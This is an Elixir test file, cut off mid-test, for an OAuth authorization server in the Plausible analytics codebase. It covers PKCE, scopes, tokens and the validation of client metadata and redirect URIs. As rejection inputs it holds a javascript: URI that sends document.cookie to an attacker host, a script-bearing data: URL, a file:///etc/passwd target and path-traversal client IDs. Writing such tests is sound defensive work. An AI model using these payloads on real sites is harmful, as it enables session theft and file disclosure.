defmodule Plausible.OAuthTest do
  use Plausible.DataCase, async: true
  use Plausible.Test.Support.DNS

  alias Plausible.Auth.Scopes
  alias Plausible.OAuth
  alias Plausible.OAuth.{AuthorizationCode, Grant, ProtectedResources, Token}

  @client_id "https://client.example.com/oauth-metadata"
  @redirect_uri "https://client.example.com/callback"

  defp pkce do
    verifier = :crypto.strong_rand_bytes(32) |> Base.url_encode64(padding: false)
    {verifier, challenge_for(verifier)}
  end

  defp challenge_for(verifier),
    do: :crypto.hash(:sha256, verifier) |> Base.url_encode64(padding: false)

  defp resource(), do: ProtectedResources.get_resource_url(mcp())

  defp mcp(), do: ProtectedResources.mcp()

  defp supported_scopes(), do: mcp().scopes_supported

  defp create_code(user, team, challenge, overrides \\ %{}) do
    attrs =
      Map.merge(
        %{
          client_id: @client_id,
          redirect_uri: @redirect_uri,
          code_challenge: challenge,
          code_challenge_method: "S256",
          scopes: supported_scopes(),
          resource: resource()
        },
        overrides
      )

    OAuth.create_authorization_code(user, team, attrs)
  end

  defp past, do: NaiveDateTime.add(NaiveDateTime.utc_now(:second), -1, :second)

  defp get_code(raw_code) do
    Plausible.Repo.get_by!(AuthorizationCode, code_hash: Token.hash(raw_code))
  end

  defp expire_code(raw_code, at) do
    Plausible.Repo.update_all(
      from(c in AuthorizationCode, where: c.code_hash == ^Token.hash(raw_code)),
      set: [expires_at: at]
    )
  end

  defp expire_grant(raw_token, at) do
    Plausible.Repo.update_all(
      from(g in Grant, where: g.access_token_hash == ^Token.hash(raw_token)),
      set: [access_token_expires_at: at, refresh_token_expires_at: at]
    )
  end

  defp set_code_scopes(raw_code, scopes) do
    Plausible.Repo.update_all(
      from(c in AuthorizationCode, where: c.code_hash == ^Token.hash(raw_code)),
      set: [scopes: scopes]
    )
  end

  defp remove_from_team(user, team) do
    Plausible.Repo.delete_all(
      from(tm in Plausible.Teams.Membership,
        where: tm.user_id == ^user.id and tm.team_id == ^team.id
      )
    )
  end

  defp issue_grant(user, team, overrides \\ %{}) do
    {verifier, challenge} = pkce()
    {:ok, code} = create_code(user, team, challenge, overrides)

    {:ok, consumed_code} =
      OAuth.consume_authorization_code(code, %{
        verifier: verifier,
        client_id: @client_id,
        redirect_uri: @redirect_uri,
        resource: resource()
      })

    {:ok, response} = OAuth.issue_token(consumed_code)
    {:ok, grant} = OAuth.find_access_token(response.access_token, mcp())

    {grant, response.access_token}
  end

  setup do
    user = new_user()
    {:ok, team} = Plausible.Teams.get_or_create(user)
    {:ok, user: user, team: team}
  end

  describe "normalize_requested_scopes/2" do
    test "defaults to the resource's own scopes when absent or empty" do
      assert {:ok, scopes} = OAuth.normalize_requested_scopes(nil, mcp())
      assert scopes == supported_scopes()

      assert {:ok, ^scopes} = OAuth.normalize_requested_scopes("", mcp())
      assert {:ok, ^scopes} = OAuth.normalize_requested_scopes("   ", mcp())
    end

    test "echoes back an explicitly requested supported scope" do
      assert {:ok, ["sites:read:*"]} = OAuth.normalize_requested_scopes("sites:read:*", mcp())
    end

    test "rejects the whole request when any scope is unsupported" do
      assert {:error, :invalid_scope} =
               OAuth.normalize_requested_scopes("stats:read:* admin:write", mcp())

      assert {:error, :invalid_scope} = OAuth.normalize_requested_scopes("nonsense", mcp())
    end

    test "refuses a parsed list, so a stored scope set cannot be defaulted here" do
      assert {:error, :invalid_scope} = OAuth.normalize_requested_scopes([], mcp())

      assert {:error, :invalid_scope} =
               OAuth.normalize_requested_scopes(supported_scopes(), mcp())
    end

    test "rejects a non-string request rather than raising" do
      assert {:error, :invalid_scope} = OAuth.normalize_requested_scopes(%{"a" => "b"}, mcp())
      assert {:error, :invalid_scope} = OAuth.normalize_requested_scopes(42, mcp())
    end

    test "is answered per resource, not against a global list" do
      other = %{resource_path: "/other", scopes_supported: [Scopes.stats_read()]}

      assert {:error, :invalid_scope} = OAuth.normalize_requested_scopes("stats:read:*", mcp())
      assert {:ok, ["stats:read:*"]} = OAuth.normalize_requested_scopes("stats:read:*", other)

      assert {:ok, ["sites:read:*"]} = OAuth.normalize_requested_scopes("sites:read:*", mcp())
      assert {:error, :invalid_scope} = OAuth.normalize_requested_scopes("sites:read:*", other)
    end
  end

  describe "normalize_granted_scopes/2" do
    test "echoes back a supported scope set in the resource's own order" do
      other = %{
        resource_path: "/other",
        scopes_supported: [Scopes.sites_read(), Scopes.stats_read()]
      }

      assert {:ok, [Scopes.sites_read(), Scopes.stats_read()]} ==
               OAuth.normalize_granted_scopes([Scopes.stats_read(), Scopes.sites_read()], other)
    end

    test "rejects the whole set when any scope is unsupported" do
      assert {:error, :invalid_scope} =
               OAuth.normalize_granted_scopes(["sites:read:*", "admin:write"], mcp())
    end

    test "refuses an empty set rather than defaulting it" do
      assert {:error, :invalid_scope} = OAuth.normalize_granted_scopes([], mcp())
    end

    test "refuses a scope parameter string rather than parsing it" do
      assert {:error, :invalid_scope} = OAuth.normalize_granted_scopes("sites:read:*", mcp())
      assert {:error, :invalid_scope} = OAuth.normalize_granted_scopes("", mcp())
      assert {:error, :invalid_scope} = OAuth.normalize_granted_scopes(nil, mcp())
    end

    test "is answered per resource, not against a global list" do
      other = %{resource_path: "/other", scopes_supported: [Scopes.stats_read()]}

      assert {:error, :invalid_scope} =
               OAuth.normalize_granted_scopes([Scopes.stats_read()], mcp())

      assert {:ok, [Scopes.stats_read()]} ==
               OAuth.normalize_granted_scopes([Scopes.stats_read()], other)
    end
  end

  describe "normalize_resource/1" do
    test "resolves a known resource named exactly to the resource itself" do
      assert {:ok, resolved} = OAuth.normalize_resource(resource())

      assert resolved == mcp()
      assert ProtectedResources.get_resource_url(resolved) == resource()
    end

    test "rejects an absent resource - there is no default target" do
      assert {:error, :invalid_target} = OAuth.normalize_resource(nil)
      assert {:error, :invalid_target} = OAuth.normalize_resource("")
    end

    test "rejects a resource this server does not protect (RFC 8707 section 2)" do
      for target <- [
            "https://elsewhere.example.com/mcp",
            resource() <> "/",
            resource() <> "?x=1",
            String.upcase(resource()),
            "/mcp",
            ["https://elsewhere.example.com/mcp"]
          ] do
        assert {:error, :invalid_target} = OAuth.normalize_resource(target)
      end
    end
  end

  describe "effective_scopes/1" do
    test "returns the granted scopes while nothing has changed", %{user: user, team: team} do
      {_verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert OAuth.effective_scopes(get_code(code)) == {:ok, supported_scopes()}
    end

    test "narrows to the scopes the resource still supports", %{user: user, team: team} do
      {_verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)
      set_code_scopes(code, [Scopes.stats_read() | supported_scopes()])

      assert OAuth.effective_scopes(get_code(code)) == {:ok, supported_scopes()}
    end

    test "refuses once every granted scope has been withdrawn", %{user: user, team: team} do
      {_verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)
      set_code_scopes(code, [Scopes.stats_read()])

      assert OAuth.effective_scopes(get_code(code)) == {:error, :stale_authorization}
    end

    test "refuses a zero-scope authorization rather than defaulting it", %{
      user: user,
      team: team
    } do
      {_verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)
      set_code_scopes(code, [])

      assert OAuth.effective_scopes(get_code(code)) == {:error, :stale_authorization}
    end

    test "refuses once the user is no longer a member of the team", %{user: user, team: team} do
      {_verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      remove_from_team(user, team)

      assert OAuth.effective_scopes(get_code(code)) == {:error, :stale_authorization}
    end

    test "counts a guest as a member of the team", %{team: team} do
      site = new_site(team: team)
      guest = add_guest(site, role: :viewer)

      {_verifier, challenge} = pkce()
      {:ok, code} = create_code(guest, team, challenge)

      assert OAuth.effective_scopes(get_code(code)) == {:ok, supported_scopes()}
    end

    test "resolves a grant the same way as a code", %{user: user, team: team} do
      {grant, _access_token} = issue_grant(user, team)

      assert OAuth.effective_scopes(grant) == {:ok, supported_scopes()}

      remove_from_team(user, team)

      assert OAuth.effective_scopes(grant) == {:error, :stale_authorization}
    end
  end

  describe "verify_pkce/3" do
    test "accepts a matching S256 verifier" do
      {verifier, challenge} = pkce()
      assert :ok = OAuth.verify_pkce(challenge, verifier, "S256")
    end

    test "rejects a mismatched verifier" do
      {_verifier, challenge} = pkce()
      assert {:error, :invalid_grant} = OAuth.verify_pkce(challenge, "wrong", "S256")
    end

    test "rejects the plain method even when the values match" do
      assert {:error, :invalid_grant} = OAuth.verify_pkce("abc", "abc", "plain")
    end

    test "rejects a missing verifier" do
      {_verifier, challenge} = pkce()
      assert {:error, :invalid_grant} = OAuth.verify_pkce(challenge, nil, "S256")
    end

    test "accepts a verifier at both length bounds (RFC 7636 section 4.1)" do
      for length <- [43, 128] do
        verifier = String.duplicate("a", length)
        assert :ok = OAuth.verify_pkce(challenge_for(verifier), verifier, "S256")
      end
    end

    test "rejects a verifier outside the length bounds even though it hashes to the challenge" do
      for length <- [0, 42, 129] do
        verifier = String.duplicate("a", length)

        assert {:error, :invalid_grant} =
                 OAuth.verify_pkce(challenge_for(verifier), verifier, "S256")
      end
    end
  end

  describe "create_authorization_code/3" do
    test "accepts a long client_id URL and redirect_uri", %{user: user, team: team} do
      {_verifier, challenge} = pkce()
      long_url = "https://client.example.com/" <> String.duplicate("a", 500)

      assert {:ok, code} =
               create_code(user, team, challenge, %{
                 client_id: long_url,
                 redirect_uri: long_url
               })

      assert_matches %AuthorizationCode{
                       client_id: ^long_url,
                       redirect_uri: ^long_url
                     } = get_code(code)
    end

    test "rejects an over-long client_name from the metadata document", %{
      user: user,
      team: team
    } do
      {_verifier, challenge} = pkce()

      assert {:error, changeset} =
               create_code(user, team, challenge, %{
                 client_name: String.duplicate("N", 256)
               })

      assert {"should be at most %{count} character(s)", _} = changeset.errors[:client_name]
    end

    test "rejects a code_challenge that is not a 43-byte S256 digest", %{user: user, team: team} do
      for challenge <- [String.duplicate("x", 42), String.duplicate("x", 300)] do
        assert {:error, changeset} = create_code(user, team, challenge)
        assert {"should be %{count} byte(s)", _} = changeset.errors[:code_challenge]
      end
    end

    test "refuses a resource this server does not protect", %{user: user, team: team} do
      {_verifier, challenge} = pkce()

      assert {:error, :invalid_target} =
               create_code(user, team, challenge, %{
                 resource: "https://elsewhere.example.com/mcp"
               })

      assert Plausible.Repo.aggregate(AuthorizationCode, :count) == 0
    end

    test "refuses an absent resource", %{user: user, team: team} do
      {_verifier, challenge} = pkce()

      assert {:error, :invalid_target} = create_code(user, team, challenge, %{resource: nil})

      assert Plausible.Repo.aggregate(AuthorizationCode, :count) == 0
    end

    test "rejects an over-long redirect_uri", %{user: user, team: team} do
      {_verifier, challenge} = pkce()

      assert {:error, changeset} =
               create_code(user, team, challenge, %{
                 redirect_uri: "https://client.example.com/" <> String.duplicate("a", 2048)
               })

      assert {"should be at most %{count} byte(s)", _} = changeset.errors[:redirect_uri]
    end

    # Unreachable through the context, which normalizes `resource` first.
    test "bounds the stored resource" do
      changeset =
        AuthorizationCode.changeset(%{
          code_hash: "hash",
          client_id: @client_id,
          redirect_uri: @redirect_uri,
          code_challenge: String.duplicate("x", 43),
          code_challenge_method: "S256",
          scopes: [],
          resource: "https://plausible.example.com/" <> String.duplicate("a", 2048),
          user_id: 1,
          team_id: 1,
          expires_at: NaiveDateTime.utc_now(:second)
        })

      assert {"should be at most %{count} byte(s)", _} = changeset.errors[:resource]
    end

    test "refuses a scope this server does not support", %{user: user, team: team} do
      {_verifier, challenge} = pkce()

      assert {:error, :invalid_scope} =
               create_code(user, team, challenge, %{scopes: ["sites:read:*", "admin:write"]})

      assert Plausible.Repo.aggregate(AuthorizationCode, :count) == 0
    end

    test "refuses an absent or empty scope set rather than defaulting it", %{
      user: user,
      team: team
    } do
      {_verifier, challenge} = pkce()

      for scopes <- [nil, [], "", Enum.join(supported_scopes(), " ")] do
        assert {:error, :invalid_scope} = create_code(user, team, challenge, %{scopes: scopes})
      end

      assert Plausible.Repo.aggregate(AuthorizationCode, :count) == 0
    end
  end

  # Only reachable directly: the context normalizes `scopes` before either
  # changeset sees it.
  describe "schema changesets" do
    test "refuse nil scopes rather than letting the insert raise" do
      code_attrs = %{
        code_hash: "hash",
        client_id: @client_id,
        redirect_uri: @redirect_uri,
        code_challenge: String.duplicate("x", 43),
        code_challenge_method: "S256",
        resource: resource(),
        user_id: 1,
        team_id: 1,
        expires_at: NaiveDateTime.utc_now(:second)
      }

      grant_attrs = %{
        user_id: 1,
        team_id: 1,
        client_id: @client_id,
        resource: resource(),
        access_token_hash: "ah",
        access_token_hint: "hint",
        access_token_expires_at: NaiveDateTime.utc_now(:second),
        refresh_token_hash: "rh",
        refresh_token_hint: "hint",
        refresh_token_expires_at: NaiveDateTime.utc_now(:second)
      }

      for changeset <- [
            AuthorizationCode.changeset(Map.put(code_attrs, :scopes, nil)),
            Grant.changeset(Map.put(grant_attrs, :scopes, nil))
          ] do
        refute changeset.valid?
        assert {"can't be blank", _} = changeset.errors[:scopes]
      end

      # An empty list is the column default, refused where it matters, not here.
      assert AuthorizationCode.changeset(Map.put(code_attrs, :scopes, [])).valid?
      assert Grant.changeset(Map.put(grant_attrs, :scopes, [])).valid?
    end
  end

  describe "consume_authorization_code/2" do
    # Without a guard, a repeated `?code[]=` param would be hashed as the
    # concatenation of its parts.
    test "rejects a non-binary code rather than raising" do
      presented = %{
        verifier: "v",
        client_id: @client_id,
        redirect_uri: @redirect_uri,
        resource: resource()
      }

      assert {:error, :invalid_grant} = OAuth.consume_authorization_code(nil, presented)
      assert {:error, :invalid_grant} = OAuth.consume_authorization_code(["ab", "c"], presented)
    end

    test "returns the code and binds user, team and scopes", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:ok, consumed_code} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })

      assert_matches %AuthorizationCode{
                       user_id: ^user.id,
                       team_id: ^team.id,
                       scopes: ^supported_scopes(),
                       client_id: ^@client_id
                     } = consumed_code
    end

    test "is single-use", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:ok, _consumed_code} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "burns the code even when validation fails", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: "wrong-verifier",
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "rejects a mismatched client_id", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: "https://other.example.com/oauth-metadata",
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "rejects a missing client_id", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: nil,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "rejects a mismatched redirect_uri", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: "https://client.example.com/other",
                 resource: resource()
               })
    end

    test "rejects a mismatched resource", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: "https://elsewhere.example.com/mcp"
               })
    end

    test "rejects an unknown code" do
      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code("nope", %{
                 verifier: "v",
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "rejects an expired code", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      expire_code(code, past())

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "rejects a code whose user has since left the team", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      remove_from_team(user, team)

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end

    test "rejects rather than narrows a code naming a withdrawn scope", %{
      user: user,
      team: team
    } do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)
      set_code_scopes(code, [Scopes.stats_read() | supported_scopes()])

      assert {:error, :invalid_grant} =
               OAuth.consume_authorization_code(code, %{
                 verifier: verifier,
                 client_id: @client_id,
                 redirect_uri: @redirect_uri,
                 resource: resource()
               })
    end
  end

  describe "issue_token/1 and find_access_token/2" do
    test "issues a bearer token resolving to the code's user, team and scopes", %{
      user: user,
      team: team
    } do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge, %{scopes: ["sites:read:*"]})

      {:ok, consumed_code} =
        OAuth.consume_authorization_code(code, %{
          verifier: verifier,
          client_id: @client_id,
          redirect_uri: @redirect_uri,
          resource: resource()
        })

      assert {:ok, response} = OAuth.issue_token(consumed_code)

      assert_matches ^strict_map(%{
                       access_token: ^any(:string),
                       refresh_token: ^any(:string),
                       token_type: "Bearer",
                       expires_in: ^OAuth.access_token_ttl(),
                       scope: "sites:read:*"
                     }) = response

      assert {:ok, token} = OAuth.find_access_token(response.access_token, mcp())

      resource = resource()

      assert_matches %Grant{
                       user: %{id: ^user.id},
                       team: %{id: ^team.id},
                       scopes: ["sites:read:*"],
                       resource: ^resource
                     } = token
    end

    test "does not persist the raw token", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      {:ok, consumed_code} =
        OAuth.consume_authorization_code(code, %{
          verifier: verifier,
          client_id: @client_id,
          redirect_uri: @redirect_uri,
          resource: resource()
        })

      {:ok, response} = OAuth.issue_token(consumed_code)

      stored =
        Plausible.Repo.one!(
          from g in Grant, where: g.access_token_hash == ^Token.hash(response.access_token)
        )

      assert_matches %Grant{
                       access_token_hash: ^any(:string, &(&1 != response.access_token)),
                       access_token_hint:
                         ^any(:string, &String.ends_with?(response.access_token, &1))
                     } = stored
    end

    test "rejects an unknown token" do
      assert {:error, :invalid_token} = OAuth.find_access_token("made-up", mcp())
    end

    # `:crypto.hash/2` takes iodata, so an unguarded ["ab", "c"] would hash to
    # the same key as "abc". Plug decodes a repeated query param into a list.
    test "rejects a non-binary token rather than raising" do
      assert {:error, :invalid_token} = OAuth.find_access_token(nil, mcp())
      assert {:error, :invalid_token} = OAuth.find_access_token(["ab", "c"], mcp())
      assert {:error, :invalid_token} = OAuth.find_access_token(%{"a" => "b"}, mcp())
    end

    test "rejects a live token presented to a resource it was not issued for", %{
      user: user,
      team: team
    } do
      {_grant, access_token} = issue_grant(user, team)

      assert {:error, :invalid_token} =
               OAuth.find_access_token(access_token, %{
                 resource_path: "/elsewhere",
                 scopes_supported: []
               })

      # Otherwise live, so the refusal above is the audience and nothing else.
      assert {:ok, _grant} = OAuth.find_access_token(access_token, mcp())
    end

    test "rejects an expired token", %{user: user, team: team} do
      {verifier, challenge} = pkce()
      {:ok, code} = create_code(user, team, challenge)

      {:ok, consumed_code} =
        OAuth.consume_authorization_code(code, %{
          verifier: verifier,
          client_id: @client_id,
          redirect_uri: @redirect_uri,
          resource: resource()
        })

      {:ok, response} = OAuth.issue_token(consumed_code)

      expire_grant(response.access_token, past())

      assert {:error, :invalid_token} = OAuth.find_access_token(response.access_token, mcp())
    end
  end

  describe "revoke_grant/1" do
    test "invalidates the grant's access token", %{user: user, team: team} do
      {grant, access_token} = issue_grant(user, team)

      assert :ok = OAuth.revoke_grant(grant)

      assert {:error, :invalid_token} = OAuth.find_access_token(access_token, mcp())
    end

    test "keeps the original revoked_at when repeated", %{user: user, team: team} do
      {grant, _access_token} = issue_grant(user, team)

      assert :ok = OAuth.revoke_grant(grant)

      revoked_at = past()

      Plausible.Repo.update_all(
        from(g in Grant, where: g.id == ^grant.id),
        set: [revoked_at: revoked_at]
      )

      assert :ok = OAuth.revoke_grant(grant)

      assert_matches %Grant{revoked_at: ^revoked_at} = Plausible.Repo.get!(Grant, grant.id)
    end
  end

  describe "redirect_uri_registered?/2" do
    test "requires an exact match for non-loopback URIs" do
      assert OAuth.redirect_uri_registered?(@redirect_uri, [@redirect_uri])
      refute OAuth.redirect_uri_registered?("https://client.example.com/other", [@redirect_uri])
      refute OAuth.redirect_uri_registered?(@redirect_uri <> "?x=1", [@redirect_uri])
    end

    test "ignores the port for loopback URIs (RFC 8252 section 7.3)" do
      registered = ["http://127.0.0.1:1234/callback"]

      assert OAuth.redirect_uri_registered?("http://127.0.0.1:55555/callback", registered)
      assert OAuth.redirect_uri_registered?("http://127.0.0.1/callback", registered)
      refute OAuth.redirect_uri_registered?("http://127.0.0.1:55555/other", registered)
      refute OAuth.redirect_uri_registered?("https://127.0.0.1:55555/callback", registered)
    end

    # OAuth 2.1 2.3.1: for loopback the port, and only the port, may differ.
    test "requires an exact match on every loopback component but the port" do
      registered = ["http://127.0.0.1:1234/callback"]

      refute OAuth.redirect_uri_registered?("http://127.0.0.1:9999/callback?next=x", registered)
      refute OAuth.redirect_uri_registered?("http://127.0.0.1:9999/callback#frag", registered)
      refute OAuth.redirect_uri_registered?("http://evil@127.0.0.1:9999/callback", registered)
    end

    test "matches a registered loopback query string only when it is identical" do
      registered = ["http://127.0.0.1:1234/callback?a=1"]

      assert OAuth.redirect_uri_registered?("http://127.0.0.1:9999/callback?a=1", registered)
      refute OAuth.redirect_uri_registered?("http://127.0.0.1:9999/callback?a=2", registered)
      refute OAuth.redirect_uri_registered?("http://127.0.0.1:9999/callback", registered)
    end

    test "does not treat different loopback hosts as equivalent" do
      assert OAuth.redirect_uri_registered?("http://localhost:1/cb", ["http://localhost:2/cb"])
      refute OAuth.redirect_uri_registered?("http://localhost:1/cb", ["http://127.0.0.1:2/cb"])
    end

    test "ignores the port for an IPv6 loopback too" do
      registered = ["http://[::1]:1234/callback"]

      assert OAuth.redirect_uri_registered?("http://[::1]:55555/callback", registered)
      refute OAuth.redirect_uri_registered?("http://[::1]:55555/other", registered)
    end

    # RFC 3986 sections 3.1 and 3.2.2: scheme and host are case-insensitive.
    test "case-folds the scheme and host of a loopback URI" do
      assert OAuth.redirect_uri_registered?("http://LOCALHOST:1/cb", ["http://LOCALHOST:2/cb"])
      assert OAuth.redirect_uri_registered?("http://LOCALHOST:1/cb", ["http://localhost:2/cb"])
      assert OAuth.redirect_uri_registered?("http://localhost:1/cb", ["http://LOCALHOST:2/cb"])
      assert OAuth.redirect_uri_registered?("HTTP://localhost:1/cb", ["http://localhost:2/cb"])
    end

    # The path is case-sensitive, and the port relaxation is loopback-only.
    test "case-folds nothing else" do
      refute OAuth.redirect_uri_registered?("http://localhost:1/CB", ["http://localhost:2/cb"])

      refute OAuth.redirect_uri_registered?("https://CLIENT.example.com:1/cb", [
               "https://CLIENT.example.com:2/cb"
             ])
    end

    test "rejects a nil redirect_uri" do
      refute OAuth.redirect_uri_registered?(nil, [@redirect_uri])
    end
  end

  describe "fetch_client_metadata/1" do
    setup do
      stub_dns()
      :ok
    end

    defp stub_metadata(doc) when is_map(doc), do: stub_body(JSON.encode!(doc))

    defp stub_body(body, status \\ 200) do
      Req.Test.stub(Plausible.OAuth, fn conn ->
        Plug.Conn.send_resp(conn, status, body)
      end)
    end

    test "returns a self-referential document" do
      stub_metadata(%{"client_id" => @client_id, "redirect_uris" => [@redirect_uri]})

      assert {:ok, doc} = OAuth.fetch_client_metadata(@client_id)
      assert doc["client_id"] == @client_id
    end

    test "fetches the document from the client_id URL, pinning the Host header" do
      Req.Test.stub(Plausible.OAuth, fn conn ->
        assert {"host", "client.example.com"} in conn.req_headers
        assert conn.request_path == "/oauth-metadata"

        Plug.Conn.send_resp(
          conn,
          200,
          JSON.encode!(%{"client_id" => @client_id, "redirect_uris" => [@redirect_uri]})
        )
      end)

      assert {:ok, _doc} = OAuth.fetch_client_metadata(@client_id)
    end

    test "rejects a non-HTTPS client_id" do
      expect_no_dns_lookup()

      assert {:error, :client_id_not_https} =
               OAuth.fetch_client_metadata("http://client.example.com/meta")
    end

    test "refuses a client_id carrying userinfo, without resolving or fetching it" do
      expect_no_dns_lookup()

      Req.Test.stub(Plausible.OAuth, fn _conn ->
        raise "should never be called"
      end)

      for client_id <- [
            "https://client.example.com@evil.example/meta",
            "https://user:pass@evil.example/meta"
          ] do
        assert {:error, :invalid_client_id} = OAuth.fetch_client_metadata(client_id)
      end
    end

    test "refuses a client_id carrying a fragment" do
      expect_no_dns_lookup()

      for client_id <- [@client_id <> "#frag", @client_id <> "#"] do
        assert {:error, :invalid_client_id} = OAuth.fetch_client_metadata(client_id)
      end
    end

    test "refuses a client_id with no path component, without resolving it" do
      expect_no_dns_lookup()

      for client_id <- ["https://client.example.com", "https://client.example.com?a=b"] do
        assert {:error, :invalid_client_id} = OAuth.fetch_client_metadata(client_id)
      end
    end

    # A whole segment of "." or ".." makes one document addressable under two
    # identities - and the client_id is the one stored on every code and grant
    # and shown on the consent screen.
    test "refuses a client_id carrying dot segments, without resolving it" do
      expect_no_dns_lookup()

      for client_id <- [
            "https://client.example.com/a/../oauth-metadata",
            "https://client.example.com/./oauth-metadata",
            "https://client.example.com/oauth-metadata/..",
            "https://client.example.com/.."
          ] do
        assert {:error, :invalid_client_id} = OAuth.fetch_client_metadata(client_id)
      end
    end

    # RFC 3986 section 6.2.2.2: "." is unreserved, so a percent-encoded one is
    # the same segment. A rule that can be spelled around is not a rule.
    test "refuses percent-encoded dot segments, without resolving it" do
      expect_no_dns_lookup()

      for client_id <- [
            "https://client.example.com/%2e%2e/oauth-metadata",
            "https://client.example.com/%2E%2E/oauth-metadata",
            "https://client.example.com/.%2e/oauth-metadata",
            "https://client.example.com/%2e/oauth-metadata"
          ] do
        assert {:error, :invalid_client_id} = OAuth.fetch_client_metadata(client_id)
      end
    end

    # The bound is dot *segments*, not dots: an extension and the conventional
    # ".well-known" prefix are both legitimate.
    test "accepts dots that are not whole path segments" do
      client_id = "https://client.example.com/.well-known/oauth-client.json"
      stub_metadata(%{"client_id" => client_id, "redirect_uris" => [@redirect_uri]})

      assert {:ok, _doc} = OAuth.fetch_client_metadata(client_id)
    end

    # A bare origin has no path component; "/" is one.
    test "accepts a client_id whose path is the root" do
      client_id = "https://client.example.com/"
      stub_metadata(%{"client_id" => client_id, "redirect_uris" => [@redirect_uri]})

      assert {:ok, _doc} = OAuth.fetch_client_metadata(client_id)
    end

    test "accepts a client_id at the length limit" do
      client_id = @client_id <> String.duplicate("a", 2048 - byte_size(@client_id))
      assert byte_size(client_id) == 2048

      stub_metadata(%{"client_id" => client_id, "redirect_uris" => [@redirect_uri]})

      assert {:ok, _doc} = OAuth.fetch_client_metadata(client_id)
    end

    test "refuses an over-long client_id, without resolving or fetching it" do
      expect_no_dns_lookup()

      Req.Test.stub(Plausible.OAuth, fn _conn ->
        raise "should never be called"
      end)

      client_id = @client_id <> String.duplicate("a", 2049 - byte_size(@client_id))
      assert byte_size(client_id) == 2049

      assert {:error, :client_id_too_long} = OAuth.fetch_client_metadata(client_id)
    end

    test "rejects a document whose client_id does not match the URL it came from" do
      stub_metadata(%{
        "client_id" => "https://attacker.example.com/meta",
        "redirect_uris" => [@redirect_uri]
      })

      assert {:error, :client_id_mismatch} = OAuth.fetch_client_metadata(@client_id)
    end

    test "rejects a document with no redirect_uris" do
      stub_metadata(%{"client_id" => @client_id})
      assert {:error, :missing_redirect_uris} = OAuth.fetch_client_metadata(@client_id)

      stub_metadata(%{"client_id" => @client_id, "redirect_uris" => []})
      assert {:error, :missing_redirect_uris} = OAuth.fetch_client_metadata(@client_id)
    end

    test "rejects a document whose redirect_uris are not usable targets" do
      for uri <- [
            "javascript:fetch('https://attacker.example.com/'+document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox",
            "file:///etc/passwd",
            # Cleartext is loopback-only (RFC 8252 section 7.3).
            "http://client.example.com/callback",
            # OAuth 2.1 section 2.3.1 forbids a fragment.
            "https://client.example.com/callback#frag",
            # Not absolute, so it names no target.
            "/callback",
            "",
            42
          ] do
        stub_metadata(%{"client_id" => @client_id, "redirect_uris" => [uri]})

        assert {:error, :invalid_redirect_uris} = OAuth.fetch_client_metadata(@client_id)
      end
    end

    test "accepts the redirect_uri shapes RFC 8252 section 7 defines" do
      for uri <- [
            "https://client.example.com/callback",
            "http://127.0.0.1:1234/callback",
            "http://localhost/callback",
            "http://[::1]:8080/callback",
            # Private-use scheme: a domain the client controls, reversed.
            "com.example.app:/oauth2redirect"
          ] do
        stub_metadata(%{"client_id" => @client_id, "redirect_uris" => [uri]})

